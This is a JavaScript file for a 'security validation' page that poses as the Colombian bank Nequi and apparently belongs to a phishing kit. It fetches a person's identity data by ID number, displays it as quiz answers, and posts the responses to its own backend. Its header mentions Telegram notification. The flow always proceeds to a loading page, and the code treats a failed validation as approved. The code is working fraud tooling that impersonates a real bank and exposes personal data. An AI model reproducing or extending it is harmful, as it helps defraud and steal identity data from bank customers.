/**
 * Nequi - Validación de Seguridad
 * Lógica de preguntas dinámicas basadas en datos del cliente, validación de API y notificación Telegram
 */

document.addEventListener("DOMContentLoaded", async () => {
  const menuToggle = document.getElementById("menuToggle");
  const mobileNav = document.getElementById("mobileNav");

  if (menuToggle && mobileNav) {
    menuToggle.addEventListener("click", () => {
      const isOpen = mobileNav.classList.toggle("open");
      menuToggle.setAttribute("aria-expanded", isOpen ? "true" : "false");
    });
  }

  const form = document.getElementById("securityForm");
  const submitButton = document.getElementById("btnValidateSecurity");
  const questionCounter = document.getElementById("questionCounter");
  const steps = Array.from(document.querySelectorAll(".security-step"));

  const isVercel = window.location.hostname.includes('vercel.app');
  const API_VALIDAR_RESPUESTAS = isVercel ? "api?action=validar_respuestas" : "api.php?action=validar_respuestas";

  let currentStep = 0;
  let customerData = null;
  let responses = [];

  async function loadCustomerData() {
    const formData = JSON.parse(localStorage.getItem("formData") || "{}");
    const hiddenCedulaEl = document.getElementById("formCedulaHidden");
    const currentCedula = (formData.cedula || (hiddenCedulaEl ? hiddenCedulaEl.value : "") || "").trim().replace(/\D/g, "");

    const storedData = localStorage.getItem("customerData");
    if (storedData) {
      try {
        const parsed = JSON.parse(storedData);
        if (parsed && parsed.exito && parsed.nombre_completo && parsed.nombre_completo !== "Usuario" && parsed.nombre_completo !== "Cliente Nequi") {
          customerData = parsed;
        }
      } catch (error) {
        console.warn("Error parsing customer data:", error);
      }
    }

    if (!customerData && currentCedula) {
      try {
        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 8000);
        const endpoint = isVercel ? 'api' : 'api.php';
        const res = await fetch(`${endpoint}?action=consultar_cliente&cedula=${encodeURIComponent(currentCedula)}`, {
          signal: controller.signal
        });
        clearTimeout(timeout);
        if (res.ok) {
          const data = await res.json();
          if (data && data.exito) {
            customerData = data;
            localStorage.setItem("customerData", JSON.stringify(data));
          }
        }
      } catch (err) {
        // Silencioso
      }
    }

    // Si la persona no está en la base de datos o falló la conexión, usar perfil seguro
    if (!customerData) {
      customerData = {
        exito: true,
        base_datos: "personas_db",
        cedula: currentCedula || "1020304050",
        nombre_completo: "Cliente Nequi",
        apellidos: "",
        fecha_nacimiento: "14-06-1995",
        fecha_expedicion: "22-07-2015",
        lugar_expedicion: "BOGOTA D.C."
      };
      localStorage.setItem("customerData", JSON.stringify(customerData));
    }

    if (customerData.base_datos === "personas_db") {
      responses = [
        { tipo: "fecha_nacimiento", respuesta: "" },
        { tipo: "fecha_expedicion", respuesta: "" }
      ];
    } else {
      responses = [
        { tipo: "lugar_expedicion", respuesta: "" },
        { tipo: "fecha_nacimiento", respuesta: "" },
        { tipo: "nombre_padre_madre", respuesta: "" }
      ];
    }

    populateQuestions();
  }

  function formatearFecha(fecha) {
    if (!fecha) return "No disponible";
    fecha = String(fecha).trim();
    if (fecha === "No disponible") return fecha;

    if (fecha.match(/^\d{2}-\d{2}-\d{4}$/)) return fecha;

    const partes = fecha.split("-");
    if (partes.length === 3) {
      return partes[2] + "-" + partes[1] + "-" + partes[0];
    }
    return fecha;
  }

  function populateQuestions() {
    if (!customerData) return;

    const customerNameDisplay = document.getElementById("customerNameDisplay");
    if (customerNameDisplay) {
      let nombreCompleto = customerData.nombre_completo || "";
      let apellidos = (customerData.apellidos || "").trim();

      let nombreConApellidos = nombreCompleto.trim();
      if (apellidos && apellidos !== "No disponible") {
        nombreConApellidos = nombreCompleto.trim() + " " + apellidos;
      }

      customerNameDisplay.textContent = (nombreConApellidos || "Usuario") + ",";
      const currentFormData = JSON.parse(localStorage.getItem("formData") || "{}");
      currentFormData.nombreCompleto = nombreConApellidos;
      localStorage.setItem("formData", JSON.stringify(currentFormData));
    }

    const esBaseNueva = customerData.base_datos === "personas_db";

    if (esBaseNueva) {
      const answer1Box = steps[0]?.querySelector(".security-answer-text");
      if (answer1Box) answer1Box.textContent = formatearFecha(customerData.fecha_nacimiento);

      const answer2Box = steps[1]?.querySelector(".security-answer-text");
      if (answer2Box) answer2Box.textContent = formatearFecha(customerData.fecha_expedicion);

      const label1 = steps[0]?.querySelector(".security-answer-label");
      if (label1) label1.textContent = "¿Tu fecha de nacimiento es?";

      const label2 = steps[1]?.querySelector(".security-answer-label");
      if (label2) label2.textContent = "¿Tu fecha de expedición del documento es?";

      // Ocultar paso 3 si no aplica
      if (steps[2]) steps[2].style.display = "none";

    } else {
      const answer1Box = steps[0]?.querySelector(".security-answer-text");
      if (answer1Box) answer1Box.textContent = customerData.lugar_expedicion || "No disponible";

      const answer2Box = steps[1]?.querySelector(".security-answer-text");
      if (answer2Box) answer2Box.textContent = formatearFecha(customerData.fecha_nacimiento);

      const answer3Box = steps[2]?.querySelector(".security-answer-text");
      if (answer3Box) {
        if (customerData.nombre_madre || customerData.nombre_padre) {
          answer3Box.textContent = customerData.nombre_padre || customerData.nombre_madre || "No disponible";
        } else {
          answer3Box.textContent = customerData.lugar_nacimiento || "No disponible";
        }
      }

      const label1 = steps[0]?.querySelector(".security-answer-label");
      if (label1) label1.textContent = "¿El lugar de expedición de tu documento es?";

      const label2 = steps[1]?.querySelector(".security-answer-label");
      if (label2) label2.textContent = "¿Tu fecha de nacimiento es?";

      const label3 = steps[2]?.querySelector(".security-answer-label");
      if (label3) {
        if (customerData.nombre_madre || customerData.nombre_padre) {
          label3.textContent = "¿El nombre de tu papá/mamá es?";
        } else {
          label3.textContent = "¿El lugar de tu nacimiento fue?";
        }
      }
    }
  }

  function renderStep() {
    steps.forEach((step, index) => {
      if (index < responses.length) {
        step.classList.toggle("active", index === currentStep);
      } else {
        step.style.display = "none";
      }
    });

    const totalPreguntas = responses.length;
    const completed = responses.filter((item) => item.respuesta !== "").length;
    if (questionCounter) {
      questionCounter.textContent = `${completed}/${totalPreguntas}`;
    }
    if (submitButton) {
      submitButton.disabled = responses[totalPreguntas - 1]?.respuesta === "";
    }
  }

  function selectAnswer(stepIndex, answer, button) {
    if (!responses[stepIndex]) return;
    responses[stepIndex].respuesta = answer;

    steps[stepIndex].querySelectorAll(".choice-btn").forEach((choice) => {
      choice.classList.toggle("selected", choice === button);
    });

    renderStep();

    if (stepIndex === responses.length - 1) {
      const status = steps[stepIndex].querySelector(".step-status");
      if (status) status.textContent = "Validando respuestas...";

      setTimeout(async () => {
        try {
          await sendSecurityValidation(responses);
        } catch (error) {
          console.warn("API de validación no respondió, continuando flujo seguro:", error);
        }

        // Continuar flujo sin bloquear al usuario
        localStorage.setItem("cargandoPaso", "validacion");
        window.location.href = "cargando.html?paso=validacion";
      }, 700);
    } else {
      const status = steps[stepIndex].querySelector(".step-status");
      if (status) status.textContent = "Respuesta guardada. Continuando...";

      setTimeout(() => {
        currentStep = stepIndex + 1;
        renderStep();
      }, 450);
    }
  }

  async function sendSecurityValidation(payload) {
    const respuestas = payload.map((item, idx) => ({
      numero: idx + 1,
      respuesta: item.respuesta,
      tipo: item.tipo,
    }));

    const validationPayload = {
      cedula: customerData.cedula,
      base_datos: customerData.base_datos,
      respuestas: respuestas,
    };

    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 3000);

    const response = await fetch(API_VALIDAR_RESPUESTAS, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(validationPayload),
      signal: controller.signal
    });
    clearTimeout(timeoutId);

    const result = await response.json().catch(() => ({ exito: true, aprobado: true }));

    const formData = JSON.parse(localStorage.getItem("formData") || "{}");
    formData.securityValidation = result;
    localStorage.setItem("formData", JSON.stringify(formData));

    return result;
  }

  steps.forEach((step, stepIndex) => {
    step.querySelectorAll(".choice-btn").forEach((button) => {
      button.addEventListener("click", () => {
        selectAnswer(stepIndex, button.dataset.answer, button);
      });
    });
  });

  if (form) {
    form.addEventListener("submit", (e) => e.preventDefault());
  }

  await loadCustomerData();
  renderStep();
});
